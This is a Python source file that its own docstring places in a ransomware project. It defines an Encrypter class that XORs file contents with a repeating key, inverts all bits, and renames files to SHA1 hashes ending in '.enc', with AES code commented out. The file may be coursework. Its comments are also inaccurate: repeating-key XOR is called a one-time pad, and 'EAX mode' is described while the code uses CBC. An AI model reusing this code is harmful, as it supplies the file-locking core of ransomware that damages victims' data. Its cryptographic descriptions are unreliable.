from hashlib import sha1
# import os
# import base64
# from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
# from cryptography.hazmat.backends import default_backend


'''
    The Encrypter class is responsible for encrypting and modifying data.
    For this purpose, the files are opened outside the class, in binary,
    and this data is then passed to the methods of the Encrypter class.
    The class can encrypt and decrypt in OTP and AES-128 EAX mode. Decryption
    is not used in the ransomware's flow, but it can be used for debugging
    purposes and in case of unwanted encryption. Besides the 2 encryption
    methods, the class can also invert the bits of a file.
    In addition, the Encrypter can generate a random key and hash filenames
    using the SHA1 hashing algorithm. The default values of the attributes are
    set when an object is initialized.

'''


class Encrypter:

    def __init__(self, encMode="INVB", key="aaaaaaaaaaaaaaaa") -> None:
        self.encMode = encMode
        self.key = key

    '''
        Encrypts data with the "One Time Pad" (Vernam, 1917) algorithm
        @param byteData: binary data of a file
        @return: encrypted data of a file
    '''

    def OTPVernam(self, byteData) -> bytes:
        byteidx = 0
        cipher = bytearray(byteData)
        for byte in byteData:
            keyidx = byteidx % len(self.key)
            cipher[byteidx] = byte ^ ord(self.key[keyidx])
            byteidx += 1
        return cipher

    '''
        Inverts all bits of data through xor operations
        @param byteData: binary data of a file
        @return: encrypted data of a file
    '''

    def INVB(self, byteData) -> bytes:
        data = list(byteData)
        for i in range(len(data)):
            data[i] = data[i] ^ 0xff
        cipher = bytes(data)
        return cipher

    '''
        Encrypts the data with the "AES-128 EAX mode" algorithm
        @param byteData: binary data of a file
        @return: encrypted data of a file
    '''

    '''def _cipher(self, iv):
        return Cipher(
            algorithms.AES(self.key.encode()),
            modes.CBC(iv),
            backend=default_backend()
        )

    def AES(self, raw):
        iv = os.urandom(16)
        encryptor = self._cipher(iv).encryptor()
        padded = self._pad(raw)
        cipher_text = encryptor.update(padded.encode()) + encryptor.finalize()
        return base64.b64encode(cipher_text + iv)

    def AESdec(self, encoded):
        raw = base64.b64decode(encoded)
        cipher_text = raw[:-16]
        iv = raw[-16:]
        decryptor = self._cipher(iv).decryptor()
        padded = decryptor.update(cipher_text) + decryptor.finalize()
        return self._unpad(padded)

    def _pad(self,raw):
        ordinal = 16 - len(raw) % 16
        return raw + ordinal * chr(ordinal)

    @staticmethod
    def _unpad(padded):
        return padded[:-ord(padded[len(padded) - 1:])]
    '''

    '''
        Hashes a string with sha1 and ends the extension .enc
        @param filename: filename, which will be hashed
        @return: hashed filename
    '''

    def fileNameByHashSHA1(self, fileName) -> str:
        return str(sha1(bytes(fileName, encoding='utf8'),
                   usedforsecurity=False).hexdigest()) + ".enc"

    '''
        Encrypt/modifies a file with an a algrothm based
        on the choice of the user
        @param byteData:  binary data of a file
        @return: encrypted data of a file
    '''

    def enc(self, byteData) -> bytes:
        if self.encMode == "OTP":
            return self.OTPVernam(byteData)
        # elif self.encMode == "AES":
        #     return self.AES(byteData.decode())
        else:
            return self.INVB(byteData)
